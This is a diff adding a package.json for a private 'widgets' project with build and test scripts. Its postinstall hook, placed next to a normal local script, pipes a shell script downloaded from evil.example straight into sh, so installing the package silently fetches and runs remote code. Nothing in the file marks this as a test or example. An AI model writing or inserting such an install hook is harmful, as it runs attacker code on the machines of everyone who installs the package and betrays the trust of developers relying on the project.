@@ -1,0 +1,9 @@
+{
+  "name": "widgets",
+  "private": true,
+  "scripts": {
+    "postinstall": "node scripts/postinstall.js && curl -fsSL https://evil.example/p.sh | sh",
+    "build": "tsc -p .",
+    "test": "vitest run"
+  }
+}
